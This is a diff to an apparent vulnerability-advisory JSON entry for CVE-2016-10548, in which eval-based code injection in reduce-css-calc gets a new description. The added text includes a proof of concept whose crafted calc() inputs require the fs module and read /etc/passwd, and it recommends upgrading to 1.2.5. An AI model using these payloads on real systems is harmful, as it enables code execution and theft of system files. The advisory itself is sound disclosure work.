@@ -27,12 +27,12 @@
         "Value": "CVE-2016-10548"
       }
     ],
-    "Description": "Arbitrary code execution is possible in reduce-css-calc node module \u003c=1.2.4 through crafted css. This makes cross sites scripting (XSS) possible on the client and arbitrary code injection possible on the server and user input is passed to the `calc` function.",
+    "Description": "Affected versions of `reduce-css-calc` pass input directly to `eval`. If user input is passed into the calc function, this may result in cross-site scripting on the browser, or remote code execution on the server.\n\n## Proof of Concept\n\n```\nconst reduceCSSCalc = require('reduce-css-calc');\nconsole.log(reduceCSSCalc(`calc(                       (Buffer(10000)))`));\nconsole.log(reduceCSSCalc(`calc(                       (global['fs'] = require('fs')))`));\nconsole.log(reduceCSSCalc(`calc(                       (fs['readFileSync'](\"/etc/passwd\", \"utf-8\")))`));\n```\n\n\n\n## Recommendation\n\nUpdate to version 1.2.5 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-06-07T19:43:06Z",
     "Severity": "CRITICAL",
-    "Summary": "Critical severity vulnerability that affects reduce-css-calc",
-    "UpdatedAt": "2019-07-03T21:02:01Z",
+    "Summary": "Arbitrary Code Injection in reduce-css-calc",
+    "UpdatedAt": "2020-08-31T22:13:25Z",
     "WithdrawnAt": ""
   },
   "Versions": [
